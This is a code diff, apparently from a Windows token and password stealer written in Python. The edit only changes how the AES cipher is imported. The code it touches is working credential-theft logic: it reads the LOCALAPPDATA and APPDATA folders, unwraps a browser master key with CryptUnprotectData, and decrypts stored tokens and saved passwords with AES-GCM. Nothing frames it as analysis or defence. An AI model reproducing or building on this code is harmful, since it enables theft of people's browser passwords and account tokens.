@@ -1,7 +1,6 @@
-import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes
+import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES
 from threading import Thread
 import win32crypt
-from Cryptodome.Cipher import AES
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -74,7 +73,7 @@ class main():
 
 	def decrypt_token(self, buff, master_key):
 		try:
-			return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
+			return Cryptodome.Cipher.AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], Cryptodome.Cipher.AES.MODE_GCM,
 						   buff[3:15]).decrypt(buff[15:])[:-16].decode()
 		except: pass
 
@@ -90,7 +89,7 @@ class main():
 		try:
 			iv = buff[3:15]
 			payload = buff[15:]
-			cipher = AES.new(master_key, AES.MODE_GCM, iv)
+			cipher = Cryptodome.Cipher.AES.new(master_key, Cryptodome.Cipher.AES.MODE_GCM, iv)
 			decrypted_pass = cipher.decrypt(payload)
 			decrypted_pass = decrypted_pass[:-16].decode()
 			return decrypted_pass
